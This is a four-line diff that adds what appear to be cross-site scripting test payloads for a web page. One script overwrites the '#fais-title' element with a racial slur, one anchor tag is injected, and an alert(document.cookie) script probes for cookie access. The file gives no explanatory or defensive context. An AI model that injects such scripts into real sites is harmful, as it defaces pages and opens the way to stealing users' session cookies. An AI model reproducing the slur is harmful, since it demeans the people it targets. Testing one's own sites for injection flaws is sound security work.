@@ -1,0 +1,4 @@
+------------------------------change title(title id)---------------------------------------
+<script>document.querySelector('#fais-title').textContent='I am nigga'</script>
+<a href=”www.google.com”> Click on this link </a>
+<script>alert(document.cookie)</script>
